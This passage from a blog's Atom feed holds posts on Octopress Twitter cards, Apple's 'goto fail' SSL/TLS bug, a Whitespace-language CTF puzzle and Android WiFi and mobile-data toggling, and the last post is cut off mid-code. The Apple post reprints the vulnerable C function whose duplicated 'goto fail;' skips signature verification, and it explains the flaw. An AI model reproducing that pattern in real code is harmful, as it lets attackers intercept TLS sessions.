</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">Example</span>
</span><span class='line'><span class="l-Scalar-Plain">description</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">This is an example post.</span>
</span><span class='line'><span class="l-Scalar-Plain">twitter_card</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">photo</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image.png</span>
</span><span class='line'>    <span class="l-Scalar-Plain">width</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">640</span>
</span><span class='line'>    <span class="l-Scalar-Plain">height</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">960</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>width</code> 태그와 <code>height</code> 태그는 사진의 크기를 나타내며 이 두 태그의 입력은 옵션이다. 자세한 사항은 <a href="https://dev.twitter.com/docs/cards/types/photo-card">Photo Card</a> 페이지에서 확인하길 바란다.</p>

<p><code>gallery</code> 타입의 경우 추가로 필요한 태그가 있으며 예제는 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;An</span><span class="nv"> </span><span class="s">example</span><span class="nv"> </span><span class="s">post&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">date</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2014-02-24</span>
</span><span class='line'><span class="l-Scalar-Plain">comments</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'><span class="l-Scalar-Plain">categories</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">Example</span>
</span><span class='line'><span class="l-Scalar-Plain">description</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">This is an example post.</span>
</span><span class='line'><span class="l-Scalar-Plain">twitter_card</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gallery</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image.png</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image1</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image1.png</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image2</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image2.png</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image3</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image3.png</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>원래 <a href="https://dev.twitter.com/docs/cards/types/gallery-card">Gallery Card</a>에 쓰이는 태그는 <code>image0</code>부터 <code>image3</code>까지지만 편의를 위해 <code>image0</code>은 <code>image</code> 태그로 대신했다. 이미지 4장의 주소가 모두 필요하다. 이 외의 카드 종류들은 필요로 하는 태그의 종류가 많고 일일이 입력하기에도 불편할 것 같아 구현하지 않았다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Apple's SSL/TLS bug &rarr;]]></title>
    <link href="http://yous.be/2014/02/23/apples-ssl-tls-bug/"/>
    <updated>2014-02-23T04:59:18+09:00</updated>
    <id>http://yous.be/2014/02/23/apples-ssl-tls-bug</id>
    <content type="html"><![CDATA[<p>iOS 7.0.6, iOS 6.1.6, Apple TV 6.0.2가 <a href="http://9to5mac.com/2014/02/21/apple-releases-ios-7-0-6-ios-6-1-6-with-fixes/">배포됐다</a>. 애플에서 공개한 iOS 7.0.6의 <a href="http://support.apple.com/kb/HT6147">보안 문제</a>는 다음과 같다.</p>

<blockquote><p>Impact: An attacker with a privileged network position may capture or modify data in sessions protected by SSL/TLS</p>

<p>Description: Secure Transport failed to validate the authenticity of the connection. This issue was addressed by restoring missing validation steps.</p></blockquote>

<p>그런데 이 문제의 원인이 된 <a href="http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c">소스 코드</a>가 흥미롭다. Adam Langley의 <a href="https://www.imperialviolet.org/2014/02/22/applebug.html">이 버그에 관한 글</a>에 따르면 실제 소스는 이렇다:</p>

<figure class='code'><figcaption><span>sslKeyExchange.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="n">OSStatus</span>
</span><span class='line'><span class="nf">SSLVerifySignedServerKeyExchange</span><span class="p">(</span><span class="n">SSLContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">isRsa</span><span class="p">,</span> <span class="n">SSLBuffer</span> <span class="n">signedParams</span><span class="p">,</span>
</span><span class='line'>                                 <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">signature</span><span class="p">,</span> <span class="n">UInt16</span> <span class="n">signatureLen</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">OSStatus</span>        <span class="n">err</span><span class="p">;</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">ReadyHash</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SSLHashSHA1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">SSLHashSHA1</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clientRandom</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">SSLHashSHA1</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">serverRandom</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">SSLHashSHA1</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">signedParams</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">SSLHashSHA1</span><span class="p">.</span><span class="n">final</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hashOut</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="nl">fail:</span>
</span><span class='line'>    <span class="n">SSLFreeBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">signedHashes</span><span class="p">);</span>
</span><span class='line'>    <span class="n">SSLFreeBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hashCtx</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>단지 <code>goto fail;</code> 라인이 하나 더 있어서 <code>if</code>문과 관계 없이 두 번째 <code>goto</code>문이 실행되어 signature verification을 무조건 통과하게 된다.</p>

<blockquote><p>Note the two <code>goto fail</code> lines in a row. The first one is correctly bound to the if statement but the second, despite the indentation, isn&rsquo;t conditional at all. The code will always jump to the end from that second goto, <code>err</code> will contain a successful value because the SHA1 update operation was successful and so the signature verification will never fail.</p></blockquote>

<p>또한 OS X 10.9.1에는 아직 <a href="http://9to5mac.com/2014/02/22/apple-patched-a-major-ssl-bug-in-ios-yesterday-but-os-x-is-still-at-risk/">이 문제</a>가 있는 것으로 보인다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ghost in the Shellcode 2014: inview Write-up]]></title>
    <link href="http://yous.be/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up/"/>
    <updated>2014-01-20T22:21:24+09:00</updated>
    <id>http://yous.be/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up</id>
    <content type="html"><![CDATA[<h2><a id="question-3-inview"></a>Question 3 - inview</h2>

<blockquote><p>Points: 150</p>

<p>The key is in view, what is it? <a href="https://2014.ghostintheshellcode.com/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155">File</a></p></blockquote>

<p>If the above link doesn&rsquo;t work, please use this <a href="http://yous.be/downloads/2014/01/20/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155">link</a>.</p>

<p>Extract file with this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>mv inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155 inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155.xz
</span><span class='line'>xz -d inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155.xz
</span></code></pre></td></tr></table></div></figure>


<p>Then we can see some trailing whitespace in <code>inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155</code>.</p>

<h2><a id="how-to-highlight-trailing-whitespace-in-vim"></a>How to Highlight Trailing Whitespace in Vim</h2>

<p>Add this code to your <code>.vimrc</code>:</p>

<figure class='code'><figcaption><span>.vimrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'><span class="nb">highlight</span> ExtraWhitespace ctermbg<span class="p">=</span><span class="k">red</span> guibg<span class="p">=</span><span class="k">red</span>
</span><span class='line'>autocmd <span class="nb">BufWinEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
</span><span class='line'>autocmd <span class="nb">InsertEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">//</span>
</span><span class='line'>autocmd <span class="nb">InsertLeave</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
</span><span class='line'><span class="k">if</span> <span class="k">version</span> <span class="p">&gt;=</span> <span class="m">702</span>
</span><span class='line'>  autocmd <span class="nb">BufWinLeave</span> * <span class="k">call</span> clearmatches<span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then <a href="http://www.vim.org">Vim</a> highlights trailing whitespace to red color.</p>

<h2><a id="how-to-solve"></a>How to Solve</h2>

<p>I felt something weird, so I converted the file to hex code. In Vim:</p>

<pre><code>:%!xxd
</code></pre>

<p>Looking at whitespace, I realized there are <code>09(Tab)</code>, <code>0A(New Line)</code>, <code>20(Space)</code> with no rule. Right after that I came up with <a href="http://compsoc.dur.ac.uk/whitespace/">Whitespace</a>. Also there is a <a href="http://ws2js.luilak.net/interpreter.html">interpreter written in JavaScript</a>. Almost done! Just copy and paste the file content to site and press &lsquo;Exec&rsquo; button. If you want to execute it in local, you can use <a href="https://github.com/hostilefork/whitespacers">whitespacers</a>.</p>

<p>Finally the key is:</p>

<pre><code>WhitespaceProgrammingIsHard
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Check and Toggle WiFi or 3G/4G State in Android]]></title>
    <link href="http://yous.be/2013/12/07/how-to-check-and-toggle-wifi-or-3g-4g-state-in-android/"/>
    <updated>2013-12-07T18:28:05+09:00</updated>
    <id>http://yous.be/2013/12/07/how-to-check-and-toggle-wifi-or-3g-4g-state-in-android</id>
    <content type="html"><![CDATA[<h2>Overview</h2>

<ol>
<li><a href="#1">Check if WiFi or 3G/4G is Enabled (by User)</a>

<ol>
<li><a href="#1-1">WiFi</a></li>
<li><a href="#1-2">3G/4G</a></li>
</ol>
</li>
<li><a href="#2">Check if WiFi or 3G/4G is Connected</a>

<ol>
<li><a href="#2-1">WiFi</a></li>
<li><a href="#2-2">3G/4G</a></li>
</ol>
</li>
<li><a href="#3">Toggle WiFi or 3G/4G Programmatically</a>

<ol>
<li><a href="#3-1">WiFi</a></li>
<li><a href="#3-2">3G/4G</a></li>
</ol>
</li>
</ol>


<p>At some point, we want to know whether the device is connected to network so that we can do some network processes. Also we want to know if <em>user</em> make WiFi or 3G/4G disabled on purpose. Both things are able to know.</p>

<!-- more -->


<h2><a id="1"></a>1. Check if WiFi or 3G/4G is Enabled (by User)</h2>

<h3><a id="1-1"></a>WiFi</h3>

<p><code>ACCESS_WIFI_STATE</code> permission must be added to <code>AndroidManifest.xml</code>.</p>

<figure class='code'><figcaption><span>AndroidManifest.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Checking code is simple. In activity, <a href="http://developer.android.com/reference/android/net/wifi/WifiManager.html">WifiManager</a> has a handy method.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">WifiManager</span> <span class="n">wifiManager</span> <span class="o">=</span> <span class="o">(</span><span class="n">WifiManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="n">WIFI_SERVICE</span><span class="o">);</span>
</span><span class='line'><span class="kt">boolean</span> <span class="n">wifiEnabled</span> <span class="o">=</span> <span class="n">wifiManager</span><span class="o">.</span><span class="na">isWifiEnabled</span><span class="o">();</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="1-2"></a>3G/4G</h3>

<p>This is more complicated. As WiFi case, we have to add <code>ACCESS_NETWORK_STATE</code> permission.</p>

<figure class='code'><figcaption><span>AndroidManifest.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then we get <a href="http://developer.android.com/reference/android/net/NetworkInfo.html">NetworkInfo</a> from <a href="http://developer.android.com/reference/android/net/ConnectivityManager.html">ConnectivityManager</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">ConnectivityManager</span> <span class="n">connectivityManager</span> <span class="o">=</span>
</span><span class='line'>    <span class="o">(</span><span class="n">ConnectivityManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="n">CONNECTIVITY_SERVICE</span><span class="o">);</span>
</span><span class='line'><span class="n">NetworkInfo</span> <span class="n">mobileInfo</span> <span class="o">=</span>
</span><span class='line'>    <span class="n">connectivityManager</span><span class="o">.</span><span class="na">getNetworkInfo</span><span class="o">(</span><span class="n">ConnectivityManager</span><span class="o">.</span><span class="na">TYPE_MOBILE</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>See <a href="http://developer.android.com/reference/android/net/NetworkInfo.html#getState()">getState()</a> overview.</p>

<blockquote><p>Reports the current coarse-grained state of the network.</p></blockquote>

<p>There are 6 types of <a href="http://developer.android.com/reference/android/net/NetworkInfo.State.html">NetworkInfo.State</a>.</p>

<ul>
<li><code>CONNECTED</code></li>
<li><code>CONNECTING</code></li>
<li><code>DISCONNECTED</code></li>
<li><code>DISCONNECTING</code></li>
<li><code>SUSPENDED</code></li>
<li><code>UNKNOWN</code></li>
</ul>


<p>Also this is <a href="http://developer.android.com/reference/android/net/NetworkInfo.html#getReason()">getReason()</a> overview.</p>

<blockquote><p>Report the reason an attempt to establish connectivity failed, if one is available.</p></blockquote>

<p>We can realize that when <code>NetworkInfo.State</code> is <code>DISCONNECTED</code>, <code>getReason()</code> reports to us why mobile data is disconnected.</p>

<p>Also I tested several times with <code>getState()</code> and <code>getReason()</code>.</p>

<ul>
<li><p>Enable WiFi and 3G/4G</p>

<p>When WiFi is connected, mobile data connection automatically closed.</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; DISCONNECTED</span>
</span><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getReason</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; &quot;dataDisabled&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Enable WiFi only</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; DISCONNECTED</span>
</span><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getReason</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; &quot;specificDisabled&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Enable 3G/4G only</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; CONNECTED</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Disable both</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; DISCONNECTED</span>
</span><span class='line'><span class="n">mobileInfo</span><span class="o">.</span><span class="na">getReason</span><span class="o">()</span>
</span><span class='line'><span class="c1">// =&gt; &quot;specificDisabled&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the code would be like this.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">String</span> <span class="n">reason</span> <span class="o">=</span> <span class="n">mobileInfo</span><span class="o">.</span><span class="na">getReason</span><span class="o">();</span>
</span><span class='line'><span class="kt">boolean</span> <span class="n">mobileDisabled</span> <span class="o">=</span> <span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span> <span class="o">==</span> <span class="n">NetworkInfo</span><span class="o">.</span><span class="na">State</span><span class="o">.</span><span class="na">DISCONNECTED</span>
</span><span class='line'>    <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">reason</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">reason</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;specificDisabled&quot;</span><span class="o">));</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="2"></a>2. Check if WiFi or 3G/4G is Connected</h2>

<p>WiFi or 3G/4G may not be connected even if the user enables them. Checking connectivity is useful when we are going to do some network communication.</p>

<h3><a id="2-1"></a>WiFi</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">NetworkInfo</span> <span class="n">wifiInfo</span> <span class="o">=</span>
</span><span class='line'>    <span class="n">connectivityManager</span><span class="o">.</span><span class="na">getNetworkInfo</span><span class="o">(</span><span class="n">ConnectivityManager</span><span class="o">.</span><span class="na">TYPE_WIFI</span><span class="o">);</span>
</span><span class='line'><span class="kt">boolean</span> <span class="n">wifiConnected</span> <span class="o">=</span> <span class="n">wifiInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span> <span class="o">==</span> <span class="n">NetworkInfo</span><span class="o">.</span><span class="na">State</span><span class="o">.</span><span class="na">CONNECTED</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="2-2"></a>3G/4G</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">NetworkInfo</span> <span class="n">mobileInfo</span> <span class="o">=</span>
</span><span class='line'>    <span class="n">connectivityManager</span><span class="o">.</span><span class="na">getNetworkInfo</span><span class="o">(</span><span class="n">ConnectivityManager</span><span class="o">.</span><span class="na">TYPE_MOBILE</span><span class="o">);</span>
</span><span class='line'><span class="kt">boolean</span> <span class="n">mobileConnected</span> <span class="o">=</span> <span class="n">mobileInfo</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span> <span class="o">==</span> <span class="n">NetworkInfo</span><span class="o">.</span><span class="na">State</span><span class="o">.</span><span class="na">CONNECTED</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="3"></a>3. Toggle WiFi or 3G/4G Programmatically</h2>

<h3><a id="3-1"></a>WiFi</h3>

<p><code>CHANGE_WIFI_STATE</code> permission must be added to <code>AndroidManifest.xml</code>.</p>

<figure class='code'><figcaption><span>AndroidManifest.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Enabling or disabling WiFi is easy.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">WifiManager</span> <span class="n">wifiManager</span> <span class="o">=</span> <span class="o">(</span><span class="n">WifiManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="n">WIFI_SERVICE</span><span class="o">);</span>
</span><span class='line'><span class="n">wifiManager</span><span class="o">.</span><span class="na">setWifiEnabled</span><span class="o">(</span><span class="n">isWifiEnabled</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="3-2"></a>3G/4G</h3>

<p>There is an workaround with reflection on <a href="http://stackoverflow.com/questions/12535101/how-can-i-turn-off-3g-data-programmatically-on-android#12535246">&ldquo;How can i turn off 3G/Data programmatically on Android?&rdquo;</a>.</p>

<p>For Android 2.3 and above:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">setMobileDataEnabled</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">enabled</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="kd">final</span> <span class="n">ConnectivityManager</span> <span class="n">conman</span> <span class="o">=</span>
</span><span class='line'>      <span class="o">(</span><span class="n">ConnectivityManager</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">CONNECTIVITY_SERVICE</span><span class="o">);</span>
</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">final</span> <span class="n">Class</span> <span class="n">conmanClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">conman</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
</span><span class='line'>    <span class="kd">final</span> <span class="n">Field</span> <span class="n">iConnectivityManagerField</span> <span class="o">=</span> <span class="n">conmanClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&quot;mService&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="n">iConnectivityManagerField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'>    <span class="kd">final</span> <span class="n">Object</span> <span class="n">iConnectivityManager</span> <span class="o">=</span> <span class="n">iConnectivityManagerField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">conman</span><span class="o">);</span>
</span><span class='line'>    <span class="kd">final</span> <span class="n">Class</span> <span class="n">iConnectivityManagerClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span>
</span><span class='line'>        <span class="n">iConnectivityManager</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
